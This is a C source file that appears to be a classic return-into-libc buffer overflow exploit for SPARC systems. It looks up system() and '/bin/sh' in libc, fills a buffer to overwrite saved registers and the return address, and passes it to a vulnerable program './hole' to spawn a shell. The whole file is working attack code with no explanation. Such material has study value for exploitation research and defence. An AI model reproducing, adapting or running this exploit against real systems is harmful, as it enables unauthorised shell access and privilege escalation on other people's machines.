#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <setjmp.h>

#define BUFSZ 100

int step;
jmp_buf env;

void fault()
{
   if (step<0)
      longjmp(env,1);
   else
   {
      printf("Couldn't find /bin/sh at a good place in libc.\n");
      exit(1);
   }
}

int main(int argc, char **argv)
{
   void *handle;
   long systemaddr;
   long shell;

   char examp[512];
   char *args[3];
   char *envs[1];

   long *lp;

   if (!(handle=dlopen(NULL,RTLD_LAZY)))
   {
      fprintf(stderr,"Can't dlopen myself.\n");
      exit(1);
   }

   if ((systemaddr=(long)dlsym(handle,"system"))==NULL)
   {
      fprintf(stderr,"Can't find system().\n");
      exit(1);
   }

   systemaddr-=8;

   if (!(systemaddr & 0xff) || !(systemaddr * 0xff00) ||
      !(systemaddr & 0xff0000) || !(systemaddr & 0xff000000))
   {
      fprintf(stderr,"the address of system() contains a '0'. sorry.\n");
      exit(1);
   }

   printf("System found at %lx\n",systemaddr);

   /* let's search for /bin/sh in libc - from SD's original linux exploits */

   if (setjmp(env))
      step=1;
   else
      step=-1;

   fprintf(stderr,"setjmp() ok\n");

   shell=systemaddr;

   signal(SIGSEGV,fault);
   fprintf(stderr,"signal() ok\n");

   do
      while (memcmp((void *)shell, "/bin/sh", 8)) shell+=step;
   while (!(shell & 0xff) || !(shell & 0xff00) || !(shell & 0xff0000)
         || !(shell & 0xff000000));

   printf("/bin/sh found at %lx\n",shell);

   /* our buffer */
   memset(examp,'A',BUFSZ);
   lp=(long *)&(examp[BUFSZ]);

   /* junk */
   *lp++=0xdeadbe01;
   *lp++=0xdeadbe02;
//   *lp++=0xdeadbe03;
//   *lp++=0xdeadbe04;

   /* the saved %l registers */
   *lp++=0xdeadbe10;
   *lp++=0xdeadbe11;
   *lp++=0xdeadbe12;
   *lp++=0xdeadbe13;
   *lp++=0xdeadbe14;
   *lp++=0xdeadbe15;
   *lp++=0xdeadbe16;
   *lp++=0xdeadbe17;

   /* the saved %i registers */

   *lp++=shell;
   *lp++=0xdeadbe11;
   *lp++=0xdeadbe12;
   *lp++=0xdeadbe13;
   *lp++=0xdeadbe14;
   *lp++=0xdeadbe15;

   *lp++=0xeffffbc8;

   /* the address of system  ( -8 )*/
   *lp++=systemaddr;

   *lp++=0x0;

   args[0]="hole";
   args[1]=examp;
   args[2]=NULL;

   envs[0]=NULL;

   execve("./hole",args,envs);
}
